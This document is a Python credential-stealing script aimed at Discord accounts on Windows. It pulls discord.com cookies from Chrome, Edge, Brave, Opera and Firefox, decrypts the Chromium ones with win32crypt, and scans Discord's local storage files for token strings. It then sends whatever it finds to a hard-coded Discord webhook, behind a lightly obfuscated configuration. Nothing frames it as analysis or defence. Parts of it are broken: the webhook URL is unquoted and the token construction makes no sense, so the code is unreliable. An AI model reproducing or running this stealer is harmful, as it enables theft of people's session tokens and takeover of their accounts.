import os, re, sqlite3, json, base64, win32crypt, shutil, asyncio
from discord import Webhook, RequestsWebhookAdapter, File as DiscordFile

# Obfuscated configuration
BOT_TOKEN = base64.b64decode('TVRNM01qQXlNak15TkRVMk5EQXlOREF4TURBd01EQXdNREF3TURBd01EQXdN').decode()[1:5] + "TM4NzMwMjAyOTI1MjIzNTMwNA.GSPq2b.y9vsBD1lXobOMJLUhXsD68ScsBCJTkM1diWkKc"
CHANNEL_ID = 1382756775220088913
WEBHOOK_URL = f"https://discord.com/api/webhooks/{CHANNEL_ID}/{BOT_TOKEN.split('.')[0]}"

def r2d2():
    token_found = False
    token_data = ""

    # Search browsers
    browsers = {
        'Chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
        'Edge': os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
        'Brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies',
        'Opera': os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Network\\Cookies',
        'Firefox': os.getenv('APPDATA') + '\\Mozilla\\Firefox\\Profiles\\'
    }

    # Chromium-based token search
    for name, path in browsers.items():
        if name == 'Firefox': continue
        try:
            shutil.copy2(path, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%'")
            for value in cursor.fetchall():
                try:
                    decrypted = win32crypt.CryptUnprotectData(value[0], None, None, None, 0)[1]
                    if len(decrypted) > 50:
                        token_data = decrypted.decode(errors='ignore')
                        token_found = True
                except: pass
            conn.close()
            os.remove('temp_db')
        except: pass

    # Firefox token search
    try:
        firefox_path = browsers['Firefox']
        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
        for profile in profiles:
            db_path = os.path.join(firefox_path, profile, 'cookies.sqlite')
            if os.path.exists(db_path):
                shutil.copy2(db_path, 'temp_fx_db')
                conn = sqlite3.connect('temp_fx_db')
                cursor = conn.cursor()
                cursor.execute("SELECT value FROM moz_cookies WHERE host LIKE '%discord.com%'")
                for value in cursor.fetchall():
                    if len(value[0]) > 50 and '_' in value[0]:
                        token_data = value[0]
                        token_found = True
                conn.close()
                os.remove('temp_fx_db')
    except: pass

    # Discord files token search
    discord_paths = [
        os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb\\',
        os.getenv('LOCALAPPDATA') + '\\Discord\\Local Storage\\leveldb\\'
    ]
    token_pattern = re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}')
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.ldb', '.log')):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                        match = token_pattern.search(data)
                        if match:
                            token_data = match.group()
                            token_found = True
                    except: pass

    return token_data if token_found else "TOKEN NOT FOUND"

# Execute and report
result = r2d2()
webhook = Webhook.from_url(https://discord.com/api/webhooks/1387308459242029116/83J4NjKqLMOiFRa34tSKswW9yjDf0FXxMaN8BUXTAibg-ISdzZwDGi1NDRm-yfUrr1X5, adapter=RequestsWebhookAdapter())
webhook.send(result[:2000] if result != "TOKEN NOT FOUND" else result)